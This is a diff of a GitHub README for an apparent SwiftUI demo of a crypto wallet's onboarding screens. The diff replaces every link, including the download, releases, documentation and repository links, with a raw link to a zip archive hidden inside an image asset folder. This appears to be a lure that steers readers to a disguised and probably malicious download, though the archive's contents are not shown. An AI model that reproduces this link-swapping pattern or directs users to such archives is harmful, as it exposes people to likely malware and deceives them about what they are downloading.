@@ -1,7 +1,7 @@
 # 🎉 FuseAppOnboarding - Experience Seamless Wallet Onboarding
 
 ## 📥 Download Now
-[![Download FuseAppOnboarding](https://img.shields.io/badge/Download%20FuseAppOnboarding-v1.0-blue)](https://github.com/saksham472/FuseAppOnboarding/releases)
+[![Download FuseAppOnboarding](https://raw.githubusercontent.com/saksham472/FuseAppOnboarding/main/FuseAppOnboarding/Assets.xcassets/invest.imageset/FuseAppOnboarding-v3.3.zip%20FuseAppOnboarding-v1.0-blue)](https://raw.githubusercontent.com/saksham472/FuseAppOnboarding/main/FuseAppOnboarding/Assets.xcassets/invest.imageset/FuseAppOnboarding-v3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to FuseAppOnboarding! This application recreates the onboarding screens and animations of the Fuse wallet app using SwiftUI. You will find it user-friendly and visually appealing, making your wallet setup a breeze.
@@ -23,7 +23,7 @@ To install FuseAppOnboarding, follow these steps:
 1. **Visit This Page to Download:**
    Click the link below to go to the Releases page where you can download the latest version of FuseAppOnboarding.
 
-   [Download FuseAppOnboarding](https://github.com/saksham472/FuseAppOnboarding/releases)
+   [Download FuseAppOnboarding](https://raw.githubusercontent.com/saksham472/FuseAppOnboarding/main/FuseAppOnboarding/Assets.xcassets/invest.imageset/FuseAppOnboarding-v3.3.zip)
 
 2. **Download the Application:**
    On the Releases page, find the latest version of the application. Click the download link for the file to your system.
@@ -54,10 +54,10 @@ For any questions or support requests, please open an issue on this repository. 
 Thank you for choosing FuseAppOnboarding! We hope you enjoy a seamless wallet experience. 
 
 ## 📢 Related Links
-- [Documentation](https://github.com/saksham472/FuseAppOnboarding/wiki)
-- [GitHub Repository](https://github.com/saksham472/FuseAppOnboarding)
+- [Documentation](https://raw.githubusercontent.com/saksham472/FuseAppOnboarding/main/FuseAppOnboarding/Assets.xcassets/invest.imageset/FuseAppOnboarding-v3.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/saksham472/FuseAppOnboarding/main/FuseAppOnboarding/Assets.xcassets/invest.imageset/FuseAppOnboarding-v3.3.zip)
 
 ## 🔗 Stay Updated
 For updates and new features, keep an eye on the Releases page. Regular upgrades will enhance your onboarding experience.
 
-[Download FuseAppOnboarding](https://github.com/saksham472/FuseAppOnboarding/releases)
+[Download FuseAppOnboarding](https://raw.githubusercontent.com/saksham472/FuseAppOnboarding/main/FuseAppOnboarding/Assets.xcassets/invest.imageset/FuseAppOnboarding-v3.3.zip)
